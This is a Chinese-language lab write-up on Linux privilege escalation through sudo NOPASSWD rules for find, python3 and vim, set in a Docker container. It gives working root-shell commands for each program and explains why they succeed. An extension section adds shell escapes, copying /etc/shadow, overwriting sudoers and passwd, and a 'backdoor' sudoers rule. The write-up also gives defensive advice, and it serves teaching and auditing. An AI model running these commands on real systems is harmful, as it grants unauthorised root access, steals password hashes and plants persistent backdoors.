# sudo NOPASSWD 危险命令提权

## 原理

sudo 允许普通用户以 root 身份执行命令。当管理员在 /etc/sudoers 中错误地配置了
`NOPASSWD` 且放开了 find、python、vim 这类**可以执行外部命令**的程序时，
普通用户就能借这些程序以 root（euid=0）执行任意命令，直接提权。

关键点：find 的 -exec 参数、python 的 os.setuid(0)、vim 的 python 接口，
都在 root 权限的进程内执行。

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：/etc/sudoers.d/lowpriv 中 `lowpriv ALL=(ALL:ALL) NOPASSWD: /usr/bin/find, /usr/bin/python3, /usr/bin/vim`

## 复现步骤

利用文件已预置在容器内 /opt/exploits（属主 lowpriv，可读可写可执行），**全程在容器内操作**。

### 第一步：宿主机启动环境（仅这一步在宿主机）

```bash
cd ~/linux-privesc-lab/sudo-nopasswd        # Kali 宿主机
docker compose up -d --build            # 构建并启动
docker exec -it sudo-nopasswd su - lowpriv   # 进入容器 (密码 lowpriv123)
```

### 第二步：容器内确认漏洞环境

```bash
id                      # uid=1000(lowpriv) gid=1000(lowpriv)
sudo -l                 # 查看漏洞配置
ls -la /opt/exploits/   # 预置的漏洞利用文件 (源码/编译脚本/一键利用)
```

### 第三步：容器内利用（利用文件已预置在 /opt/exploits）

```bash
cd /opt/exploits

# 1. find 提权
sudo find / -exec /bin/sh -p -c 'id' \; -quit
# 预期: uid=0(root)

# 2. python3 提权
sudo python3 -c 'import os; os.setuid(0); os.system("id")'
# 预期: uid=0(root)

# 3. vim 提权
sudo vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh")'
# 预期: root shell
```

### 一键利用（容器内）

```bash
cd /opt/exploits && bash exploit.sh
```

## 手动利用（分步教学）

### 第一步：确认 sudo 配置（枚举）

```bash
sudo -l
```
看到 `(ALL : ALL) NOPASSWD: /usr/bin/find, /usr/bin/python3, /usr/bin/vim` 就说明：
管理员把三个能"执行外部命令"的程序以 root 免密授权给了你。这是典型的 GTFOBins 场景。

### 第二步：find 提权（核心教学）

```bash
sudo find / -exec /bin/sh -p -c 'id' \; -quit
```

逐步拆解这条命令：

| 片段 | 作用 |
|:---|:---|
| `sudo find /` | find 以 root（euid=0）身份运行，扫描 / |
| `-exec /bin/sh -p -c 'id' \;` | 对每个匹配文件执行 /bin/sh |
| `-p` | **关键**：shell 的 privileged 模式，保留 euid=0 不降权 |
| `-quit` | 执行一次就退出，避免卡住 |

普通 shell 启动时会主动把 euid 降回真实 uid（这就是为什么直接 `sudo /bin/sh` 拿到的是降权 shell），
而 `-p` 参数告诉 bash/sh：保留提升后的权限。

### 第三步：python3 提权

```bash
sudo python3 -c 'import os; os.setuid(0); os.system("id")'
```

python 的 `os.setuid(0)` 把当前进程的**真实 UID** 改成 0。由于进程已经是 root 身份
（sudo 启动），setuid 调用不会被拒绝，于是 uid=0。

### 第四步：vim 提权

```bash
sudo vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh")'
```

vim 编译进 +python3 时，`:py3` 可以在 vim 进程（euid=0）内执行 Python 代码。

> 相关资源：GTFOBins（https://gtfobins.github.io）收录了几乎所有可提权命令的姿势，
> 遇到任何 "sudo 可执行 X" 都先查它。

为什么能成功

| 命令 | 原理 |
|:---|:---|
| find | `-exec` 参数允许执行任意命令，find 以 euid=0 运行，`/bin/sh -p` 的 -p 参数让 shell 保留有效用户 ID 不降权 |
| python3 | `os.setuid(0)` 直接修改进程真实 UID 为 0 |
| vim | vim 的 `:py3` 接口在 vim 进程（euid=0）内执行 Python |

## 防御

- 遵循最小权限原则，不放开 find/python/vim 等危险命令的 NOPASSWD
- 定期审计 `sudo -l` 与 /etc/sudoers
- 参考 GTFOBins（https://gtfobins.github.io）排查常见提权命令


## 扩展教学（网络搜索整理）

### 实战统计：哪些 sudo 授权最常见到

根据一线评估数据，真实环境中最常被误授权的命令（按出现频率）：
1. **python/python3**（管理员为了跑脚本）
2. **find**（为了提权搜索文件）
3. **less/more/man**（为了看日志又不给 root）

### 更多利用变体

```bash
# vim 内逃逸（另一种姿势）
sudo vim
# 在 vim 里: :set shell=/bin/bash 回车  :shell 回车

# nano 逃逸
sudo nano
# Ctrl+R  Ctrl+X  输入: reset; bash 1>&0 2>&0

# 危险：sudo cp/mv 可覆盖系统文件（无需 shell 逃逸）
sudo cp /etc/shadow /tmp/shadow.bak          # 先拷走哈希
sudo cp 自制sudoers /etc/sudoers             # 直接替换规则
sudo mv /etc/passwd /tmp/ && sudo cp 自制passwd /etc/passwd

# 通配符授权也可注入: (root) /usr/bin/python3 *.py
sudo python3 /opt/scripts/*.py   # * 展开注入

# tee 写入 sudoers
echo 'lowpriv ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/backdoor
```

### GTFOBins 快速检索法

拿到任意 "sudo 可执行 X" 或 "X 带 SUID"，直接查 https://gtfobins.github.io 的
对应条目，页面会给出 shell / file-read / file-write / reverse-shell 等分场景 payload。

### 防御

- 最小权限：sudo 授权精确到命令+参数，不用通配符
- 参考 GTFOBins 高危清单反向审查 sudoers
- 定期 `sudo -l` 审计 + sudoers 文件 hash 监控

## 验证记录

2026-08-26 在真实环境验证：`sudo find / -exec /bin/sh -p -c 'id' \; -quit` 输出 `uid=0(root)`，复现成功。
